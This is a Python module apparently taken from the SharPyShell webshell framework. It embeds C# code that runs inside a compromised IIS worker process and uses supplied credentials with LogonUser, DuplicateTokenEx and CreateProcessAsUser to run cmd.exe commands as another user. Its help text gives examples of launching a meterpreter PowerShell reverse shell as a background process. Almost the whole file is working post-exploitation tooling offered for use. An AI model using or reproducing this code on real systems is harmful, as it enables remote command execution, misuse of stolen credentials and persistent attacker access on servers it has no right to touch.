from core.Module import Module, ModuleException
from utils.random_string import random_generator


class RunasModuleException(ModuleException):
    pass


class Runas(Module):
    _exception_class = RunasModuleException
    short_help = "Run a cmd.exe /c command spawning a new process as a specific user"
    complete_help = r"""
        This module permits run cmd /c runas command from a local service in a new process running as a specific user.
        It runs the following Win32 System Calls 'LogonUser' -> 'DuplicateTokenEx' -> 'CreateProcessAsUser' in order 
        to spawn a new process out of calling thread of w3wp.exe.
        The calling process will wait until the end of the execution of the spawned process.
        The two processes will communicate through 2 pipeline files (1 for stdout and 1 for stderr).
        The default logon type is 3 (Network_Logon).
        If you set Interactive (2) logon type you will face some restriction problems.
        If you need to spawn a background or async process, i.e. spawning a reverse shell, set the argument
        'process_timeout_ms' to 0.
        
        Usage:
            #runas os_command username password [domain] [process_timeout_ms] [logon_type] 
        
        Positional arguments:
            os_command              command supported by cmd.exe
            username                username of the user
            password                password of the user
            domain                  domain of the user, if in a domain. 
                                    Default: ''
            process_timeout_ms      the waiting time (in ms) to use in the WaitForSingleObject() function.
                                    This will halt the process until the spawned process ends and sent
                                    the output back to the webshell.
                                    If you set 0 an async process will be created and no output will be retrieved.
                                    Default: '60000'
            logon_type              the logon type for the spawned process.
                                    Default: '3'
        
        Examples:
            Run a command as a specific local user
                #runas whoami user1 password1
            Run a command as a specific domain user
                #runas whoami user1 password1 domain
            Run a background/async process as a specific local user, i.e. meterpreter ps1 reverse shell
                #runas 'powershell -nop -noni -enc base64reverse_shell' 'user1' 'password1' '' '0'
            Run a background/async process as a specific domain user, i.e. meterpreter ps1 reverse shell
                #runas 'powershell -nop -noni -enc base64reverse_shell' 'user1' 'password1' 'domain' '0'
                                                
    """

    _runtime_code = ur"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                using System.Runtime.InteropServices;using System.Security.Principal;using System.Security.Permissions;using System.Security;using Microsoft.Win32.SafeHandles;using System.Runtime.ConstrainedExecution;

                public class SharPyShell
                {
                    public sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
                    {
                        private SafeTokenHandle()
                            : base(true)
                        {
                        }
                    
                        [DllImport("kernel32.dll")]
                        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
                        [SuppressUnmanagedCodeSecurity]
                        [return: MarshalAs(UnmanagedType.Bool)]
                        private static extern bool CloseHandle(IntPtr handle);
                    
                        protected override bool ReleaseHandle()
                        {
                            return CloseHandle(handle);
                        }
                    }
                    
                    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO
                    {
                    public int cb;
                    public String lpReserved;
                    public String lpDesktop;
                    public String lpTitle;
                    public uint dwX;
                    public uint dwY;
                    public uint dwXSize;
                    public uint dwYSize;
                    public uint dwXCountChars;
                    public uint dwYCountChars;
                    public uint dwFillAttribute;
                    public uint dwFlags;
                    public short wShowWindow;
                    public short cbReserved2;
                    public IntPtr lpReserved2;
                    public IntPtr hStdInput;
                    public IntPtr hStdOutput;
                    public IntPtr hStdError;
                    }
                    
                    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION
                    {
                    public IntPtr hProcess;
                    public IntPtr hThread;
                    public uint   dwProcessId;
                    public uint   dwThreadId;
                    }
                    
                    [StructLayout(LayoutKind.Sequential)] public struct SECURITY_ATTRIBUTES
                    {
                    public int    Length;
                    public IntPtr lpSecurityDescriptor;
                    public bool   bInheritHandle;
                    }
                    
                    [DllImport("kernel32.dll", EntryPoint="CloseHandle", SetLastError=true, CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
                    public static extern bool CloseHandle(IntPtr handle);
                    
                    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
                    public static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);
        
                    [DllImport("advapi32.dll", EntryPoint="CreateProcessAsUser", SetLastError=true, CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
                    public static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
                    
                    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
                    public static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
                    
                    [DllImport("kernel32.dll", SetLastError=true)]
                    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                    
                    const uint WAIT_ABANDONED = 0x00000080;
                    const uint WAIT_OBJECT_0 = 0x00000000;
                    const uint WAIT_TIMEOUT = 0x00000102;
                
                    [PermissionSetAttribute(SecurityAction.Demand, Name = "FullTrust")]                    
                    public string RunAs(string userName, string password, string domainName, string cmd, string stdout_file, string stderr_file, string working_directory, int logon_type, uint process_ms_timeout)
                    {
                        SafeTokenHandle safeTokenHandle;
                        string output = "";
                        string error_string = "{{{SharPyShellError}}}";
                        try
                        {
                            const int LOGON32_PROVIDER_DEFAULT = 0;
                            const int LOGON32_PROVIDER_WINNT35 = 1;
                            const int LOGON32_PROVIDER_WINNT40 = 2;
                            const int LOGON32_PROVIDER_WINNT50 = 3;
                            bool returnValue = LogonUser(userName, domainName, password, logon_type, LOGON32_PROVIDER_DEFAULT, out safeTokenHandle);
                            if (false == returnValue)
                            {
                                output += error_string + "\nWrong Credentials. LogonUser failed with error code : " + Marshal.GetLastWin32Error();
                                return output;
                            }
                            using (safeTokenHandle)
                            {
                                using (WindowsIdentity newId = new WindowsIdentity(safeTokenHandle.DangerousGetHandle()))
                                {
                                    using (WindowsImpersonationContext impersonatedUser = newId.Impersonate())
                                    {
                                        IntPtr Token = new IntPtr(0);
                                        IntPtr DupedToken = new IntPtr(0);
                                        bool      ret;
                                        SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
                                        sa.bInheritHandle       = false;
                                        sa.Length               = Marshal.SizeOf(sa);
                                        sa.lpSecurityDescriptor = (IntPtr)0;
                                        Token = WindowsIdentity.GetCurrent().Token;
                                        const uint GENERIC_ALL = 0x10000000;
                                        const int SecurityImpersonation = 2;
                                        const int TokenType = 1;
                                        ret = DuplicateTokenEx(Token, GENERIC_ALL, ref sa, SecurityImpersonation, TokenType, ref DupedToken);
                                        if (ret == false){
                                             output += error_string + "\nDuplicateTokenEx failed with " + Marshal.GetLastWin32Error();
                                            return output;
                                        }
                                        STARTUPINFO si          = new STARTUPINFO();
                                        si.cb                   = Marshal.SizeOf(si);
                                        si.lpDesktop            = "";
                                        string commandLinePath = "";
                                        if(process_ms_timeout>0){
                                            File.Create(stdout_file).Dispose();
                                            File.Create(stderr_file).Dispose();
                                            commandLinePath =  Environment.GetEnvironmentVariable("ComSpec") + " /c \"" + cmd + "\" >> " + stdout_file + " 2>>" + stderr_file;
                                        }
                                        else{
                                            commandLinePath =  Environment.GetEnvironmentVariable("ComSpec") + " /c \"" + cmd + "\"";
                                        }
                                        PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
                                        ret = CreateProcessAsUser(DupedToken,null,commandLinePath, ref sa, ref sa, false, 0, (IntPtr)0, working_directory, ref si, out pi);
                                        if (ret == false){
                                            output += error_string + "\nCreateProcessAsUser failed with " + Marshal.GetLastWin32Error();
                                            return output;
                                        }
                                        else{
                                            if(process_ms_timeout>0){
                                                uint wait_for = WaitForSingleObject(pi.hProcess, process_ms_timeout);
                                                if(wait_for == WAIT_OBJECT_0){
                                                    output += File.ReadAllText(stdout_file);
                                                    string errors = File.ReadAllText(stderr_file);
                                                    if (!String.IsNullOrEmpty(errors))
                                                        output += error_string + "\n" + errors;
                                                }
                                                else{
                                                    output += error_string + "\nProcess with pid " + pi.dwProcessId + " couldn't end correctly. Error Code: " +  Marshal.GetLastWin32Error();
                                                }
                                                File.Delete(stdout_file);
                                                File.Delete(stderr_file);
                                            }
                                            else{
                                                output += "\nAsync process with pid " + pi.dwProcessId + " created";
                                            }
                                            CloseHandle(pi.hProcess);
                                            CloseHandle(pi.hThread);
                                        }
                                        CloseHandle(DupedToken);
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            output += error_string + "\nException occurred. " + ex.Message;
                            return output;
                        }
                    return output;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=RunAs(@"%s", @"%s", @"%s", @"%s", @"%s", @"%s", @"%s", %s, %s);
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
                """

    __default_domain = ''
    __default_process_ms_timeout = '60000'
    __default_logon_type = '3'

    def _parse_run_args(self, args):
        if len(args) < 3:
            raise self._exception_class('#runas: Not enough arguments. 3 Arguments required.\n')
        args_parser = {k: v for k, v in enumerate(args)}
        cmd = args_parser.get(0)
        username = args_parser.get(1)
        password = args_parser.get(2)
        domain = args_parser.get(3, self.__default_domain)
        process_ms_timeout = args_parser.get(4, self.__default_process_ms_timeout)
        logon_type = args_parser.get(5, self.__default_logon_type)
        return cmd, username, password, domain,process_ms_timeout, logon_type

    def _create_request(self, args):
        cmd, username, password, domain, process_ms_timeout, logon_type = self._parse_run_args(args)
        working_path = self._module_settings['working_directory']
        stdout_file = self._module_settings['env_directory'] + '\\' + random_generator()
        stderr_file = self._module_settings['env_directory'] + '\\' + random_generator()
        return self._runtime_code % (username, password, domain, cmd, stdout_file, stderr_file,
                                     working_path, logon_type, process_ms_timeout)


